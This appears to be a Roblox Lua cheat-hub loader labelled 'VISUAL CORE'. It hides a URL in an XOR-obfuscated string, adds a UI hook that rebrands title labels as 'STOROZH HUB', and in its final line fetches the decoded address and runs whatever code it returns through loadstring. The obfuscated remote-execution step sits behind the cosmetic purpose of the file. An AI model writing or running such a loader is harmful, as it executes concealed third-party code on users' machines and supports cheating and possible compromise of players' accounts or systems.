
--[[ STAGE 2: VISUAL CORE ]]
local vX9nrTa0NMRL8b1uUYf="\002\041\045\102\023\017\013\220\011\062\207\202\200\253\250\230\158\159\246\229\141\149\136\135\151\135\188\169\162\172\168\132\164\082\088\065\122\068\064\092\124\070\066\093\025\025\028\011\068\002\061\003\040\047\050\039\217\036\018\216\196\196\204\251\254\241\248\230\224\156\214\147\140\147\195\184\185\189\169\170\164\171\087\095\076\069\083\123\067\114\120\117\169\027\108\022\084\079\127\001\063\054\049\056"local sqFvjXYayiZA8fXR=95 local nfLvYZJId_jHb2A=245 local TQemTfiky_UwTucjya=1 local EGwhAR02DYWBN=5 local KsnPFSpBxnmo6Ovu=2 local jzN2ebrYevDi=true local VDwZNywRX9qoQ_yoDE=bit32 and bit32.bxor if not VDwZNywRX9qoQ_yoDE then VDwZNywRX9qoQ_yoDE=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local vUk18JTRHzxWal4OPO={}for Xjqu3N7mPRXk98q7iY=1,#vX9nrTa0NMRL8b1uUYf do local WeeDFYUkBgShvDwcD=string.byte(vX9nrTa0NMRL8b1uUYf,Xjqu3N7mPRXk98q7iY)local xoIpCPVrXpTq7Tkdm9p=(nfLvYZJId_jHb2A+(Xjqu3N7mPRXk98q7iY*EGwhAR02DYWBN)+KsnPFSpBxnmo6Ovu)%256 if TQemTfiky_UwTucjya==0 then WeeDFYUkBgShvDwcD=(WeeDFYUkBgShvDwcD-xoIpCPVrXpTq7Tkdm9p)%256 vUk18JTRHzxWal4OPO[Xjqu3N7mPRXk98q7iY]=string.char(VDwZNywRX9qoQ_yoDE(WeeDFYUkBgShvDwcD,sqFvjXYayiZA8fXR))else WeeDFYUkBgShvDwcD=VDwZNywRX9qoQ_yoDE(WeeDFYUkBgShvDwcD,sqFvjXYayiZA8fXR)vUk18JTRHzxWal4OPO[Xjqu3N7mPRXk98q7iY]=string.char((WeeDFYUkBgShvDwcD-xoIpCPVrXpTq7Tkdm9p)%256)end end local SaIVHYeOoCLW3HvhYB6=table.concat(vUk18JTRHzxWal4OPO)if jzN2ebrYevDi then SaIVHYeOoCLW3HvhYB6=string.reverse(SaIVHYeOoCLW3HvhYB6)end local Vt33NtdLdddHu4p_3=SaIVHYeOoCLW3HvhYB6
local HubName = "STOROZH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Vt33NtdLdddHu4p_3))()
